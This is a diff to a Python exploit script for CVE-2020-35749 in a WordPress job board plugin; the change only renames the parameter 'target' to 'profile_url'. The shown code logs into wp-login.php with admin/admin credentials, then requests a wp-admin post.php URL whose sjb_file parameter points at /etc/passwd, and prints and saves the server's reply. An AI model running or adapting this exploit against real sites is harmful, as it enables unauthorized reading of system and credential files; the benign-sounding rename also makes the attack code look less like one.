@@ -25,7 +25,7 @@ color_random = [
     Color.LOGGING
 ]    
 
-def fetch_contents(target):
+def fetch_contents(profile_url):
     fetch_path = "/etc/passwd"  
     username = "admin"          
     password = "admin"          
@@ -33,8 +33,8 @@ def fetch_contents(target):
     print(color_random[5] + "[+] Trying to fetch the contents from " + fetch_path)
     time.sleep(3)
 
-    login_url = target + "wp-login.php"
-    wp_path = target + 'wp-admin/post.php?post=application_id&action=edit&sjb_file=' + fetch_path
+    login_url = profile_url + "wp-login.php"
+    wp_path = profile_url + 'wp-admin/post.php?post=application_id&action=edit&sjb_file=' + fetch_path
 
     with requests.Session() as session:
         headers = {
@@ -59,6 +59,6 @@ def fetch_contents(target):
         print(color_random[4] + response.text)
         print(color_random[5] + "\n[+] Output Saved as: output.txt\n")
 
-def scan_cve_2020_35749(target):
-    fetch_contents(target)
+def scan_cve_2020_35749(profile_url):
+    fetch_contents(profile_url)
 
